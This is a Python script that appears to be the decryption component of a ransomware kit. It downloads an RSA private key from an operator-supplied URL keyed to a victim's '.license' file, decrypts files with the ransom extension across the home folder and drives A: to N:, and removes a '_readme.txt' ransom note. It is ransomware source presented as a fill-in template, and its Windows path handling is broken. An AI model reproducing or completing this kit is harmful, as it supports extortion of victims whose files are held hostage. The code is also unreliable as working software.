import os
import requests as req
from sys import platform
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP

def sp():
    if(platform == 'win32'):
        return '\\'
    elif(platform == 'linux'):
        return '/'

def gext(filename):
    with open(filename,'r') as license:
        ler = license.read()
    ext = '.' + ler.split('.')[1]
    return ext

def gl(filename):
    # On Website
    try:
        url_web = "YOUR URL"
        with open(filename,'r') as license:
            ler = license.read()
            l = ler.split('.')[0]
        URL_KEY = url_web + l + '.pem'
        pvk = req.get(URL_KEY).text
        return pvk
    except:
        print("Please use internet connection")

def decrypt(filename,pvk):
    with open(filename, "rb") as file:
        private_key = RSA.import_key(pvk)
        enc_session_key, nonce, tag, ciphertext = [ file.read(x) for x in (private_key.size_in_bytes(), 16, 16, -1) ]
        # Decrypt the session key with the private RSA key
        cipher_rsa = PKCS1_OAEP.new(private_key)
        session_key = cipher_rsa.decrypt(enc_session_key)
        # Decrypt the data with the AES session key
        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
        data = cipher_aes.decrypt_and_verify(ciphertext, tag)

    with open(filename, "wb") as file:
        file.write(data)


def defense(target,log):
    for p, d, f in os.walk(target):
        for name in f:
            ext = gext(log+sp()+'.license')
            pvk = gl(log+sp()+'.license')
            if name.endswith((ext)):
                try:
                    decrypt(os.path.join(p, name),pvk)
                    newFile = os.path.splitext(name)[0]
                    os.rename(os.path.join(p, name), os.path.join(p,newFile))
                except:
                    continue
                try:
                    os.remove(log+sp()+"_readme.txt")
                except:
                    status = "All Files has been Decrypted"

if __name__ == '__main__':
    if (platform == 'win32'):
        t = [os.environ["USERPROFILE"],"A:","B:","D:","E:","F:","G:","H:","I:","J:","K:","L:","M:","N:"]
        jlog = [os.environ["PROGRAMDATA"]+sp()+'Microsoft'+sp()+'Windows'+sp()+'Start Menu'+sp()+'Programs'+sp()+'StartUp']
        for i in range(len(t)):
            defense(t[i] + sp(),jlog)
    elif (platform == 'linux'):
        t = [os.environ["HOME"]]
        for i in range(len(t)):
            defense(t[i] + sp(),t[i])
    else:
        print('I will better')